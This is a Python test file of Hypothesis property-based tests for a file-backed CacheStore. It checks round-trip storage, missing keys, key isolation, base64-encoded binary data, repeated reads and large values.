@pytest.mark.property
class TestCacheStoreProperties:
    """Property-based tests for CacheStore."""

    @given(
        key=st.text(min_size=1, max_size=200),
        data=st.dictionaries(
            keys=st.text(min_size=1, max_size=20),
            values=st.text(max_size=100) | st.integers() | st.booleans(),
            min_size=1, max_size=10,
        ),
    )
    @settings(max_examples=50)
    def test_cache_put_get_roundtrip(self, key: str, data: dict[str, Any]) -> None:
        """cache_put() then cache_get() should return same data."""
        with tempfile.TemporaryDirectory() as tmpdir:
            store = CacheStore(tmpdir)
            store.put(key, data)
            retrieved = store.get(key)
            assert retrieved == data

    @given(st.text(min_size=1, max_size=200))
    @settings(max_examples=50)
    def test_cache_get_nonexistent_returns_none(self, key: str) -> None:
        """cache_get() on nonexistent key should return None."""
        with tempfile.TemporaryDirectory() as tmpdir:
            store = CacheStore(tmpdir)
            result = store.get(key)
            assert result is None

    @given(
        key1=st.text(min_size=1, max_size=100),
        key2=st.text(min_size=1, max_size=100),
        data1=st.dictionaries(keys=st.text(min_size=1, max_size=20), values=st.text(max_size=100)),
        data2=st.dictionaries(keys=st.text(min_size=1, max_size=20), values=st.text(max_size=100)),
    )
    @settings(max_examples=40)
    def test_cache_keys_isolated(self, key1: str, key2: str, data1: dict[str, Any], data2: dict[str, Any]) -> None:
        """Different cache keys should not interfere."""
        if key1 == key2:
            return

        with tempfile.TemporaryDirectory() as tmpdir:
            store = CacheStore(tmpdir)
            store.put(key1, data1)
            store.put(key2, data2)
            assert store.get(key1) == data1
            assert store.get(key2) == data2

    @given(
        key=st.text(min_size=1, max_size=200),
        data=st.binary(min_size=10, max_size=1000),
    )
    @settings(max_examples=30)
    def test_cache_handles_binary_data(self, key: str, data: bytes) -> None:
        """Cache should handle binary-encoded data via JSON."""
        import base64

        with tempfile.TemporaryDirectory() as tmpdir:
            store = CacheStore(tmpdir)
            encoded = base64.b64encode(data).decode("utf-8")
            payload = {"data": encoded}
            store.put(key, payload)
            retrieved = store.get(key)
            assert retrieved == payload
            assert base64.b64decode(retrieved["data"]) == data

    @given(st.text(min_size=1, max_size=200))
    @settings(max_examples=30)
    def test_cache_key_normalization(self, key: str) -> None:
        """Cache should normalize keys consistently."""
        with tempfile.TemporaryDirectory() as tmpdir:
            store = CacheStore(tmpdir)
            data = {"test": "value"}
            store.put(key, data)
            result1 = store.get(key)
            result2 = store.get(key)
            assert result1 == data
            assert result2 == data

    @given(
        key=st.text(min_size=1, max_size=200),
        data=st.dictionaries(
            keys=st.text(min_size=1, max_size=20),
            values=st.text(max_size=10000),
            min_size=1, max_size=5,
        ),
    )
    @settings(max_examples=20)
    def test_cache_handles_large_values(self, key: str, data: dict[str, Any]) -> None:
        """Cache should handle large JSON values."""
        with tempfile.TemporaryDirectory() as tmpdir:
            store = CacheStore(tmpdir)
            store.put(key, data)
            retrieved = store.get(key)
            assert retrieved == data


